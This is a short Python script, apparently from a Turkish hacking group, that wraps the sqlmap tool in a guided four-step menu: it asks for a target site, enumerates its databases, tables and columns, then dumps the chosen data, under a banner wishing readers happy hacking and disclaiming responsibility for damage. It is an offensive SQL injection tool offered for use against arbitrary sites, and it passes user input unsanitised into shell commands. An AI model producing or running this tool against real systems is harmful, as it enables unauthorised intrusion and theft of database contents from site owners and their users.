import os 
import sys
import socket
print("""

             ***************************************************
             *      Bu yazılım sistemlere zarar verebilir!!    *
             *                                                 *
             * sqlmapproject ve Nighty verilen hasardan sorumlu*
             * değildir.                                       *
	     *            HEPİNİZE İYİ HACKLEMELER             *
             *                                                 *
             *           ☪                         ☪           *
             ***************************************************


[---]                         SQL Injection aracı                           [---]
[---]                                                                       [---]
[---]        sqlmapproject kişisinin sqlmap yazılımını kullanmaktadır       [---]
[---]                                                                       [---]
[---]            Nighty taradından kodlandı ve kolaylaştırıldı              [---]                                 
[---]              							    [---]
[---]                            TURK HACK TEAM  	                    [---]

Lütfen 1 den başlayıp 4 de kadar teker teker ilerleyiniz

1.adım-Sitenin veri tabanları
2.adım-Veri tabanının içindeki tablolar
3.adım-Tabloların içindeki sütunlar
4.adım-Bilgileri sonuçlama

""")


devam = True

site = input('Site linki giriniz: ')
while devam:
    print("--------------------------------------------------------------------------------")
    os.system("figlet ___Nighty___ TURK HACK TEAM")
    print("--------------------------------------------------------------------------------")
    os.system('python sqlmap.py -u"' + site + '" --dbs')
    veri_tabani = input("Veri tabanı ismi giriniz: ")
    os.system('python sqlmap.py -u"' + site + '" -D ' + veri_tabani + ' --tables')
    tablo = input("Tablo ismi giriniz: ")
    os.system('python sqlmap.py -u"' + site + '" -D ' + veri_tabani + ' -T ' + tablo + ' --columns')
    sonuc = input("Almak istediğiniz bilgi adı: ")
    os.system('python sqlmap.py -u"' + site + '" -D ' + veri_tabani + ' -T ' + tablo + ' -C' + sonuc + ' --dump')
    devam = False
print('\n \nGörüşmek Üzere')